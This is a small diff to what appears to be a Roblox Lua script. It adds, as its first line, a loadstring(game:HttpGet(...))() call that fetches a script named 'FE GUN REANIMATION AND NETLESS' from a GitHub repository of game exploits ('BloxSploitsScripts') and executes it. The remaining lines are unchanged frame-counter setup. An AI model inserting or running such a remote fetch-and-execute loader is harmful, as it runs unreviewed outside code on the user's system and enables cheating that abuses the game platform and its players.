@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sx-p0t/BloxSploitsScripts/main/FE%20GUN%20REANIMATION%20AND%20NETLESS"))()
+
 _G.e = _G.e and _G.e + 1 or 0
 wait()
 local frame = 0
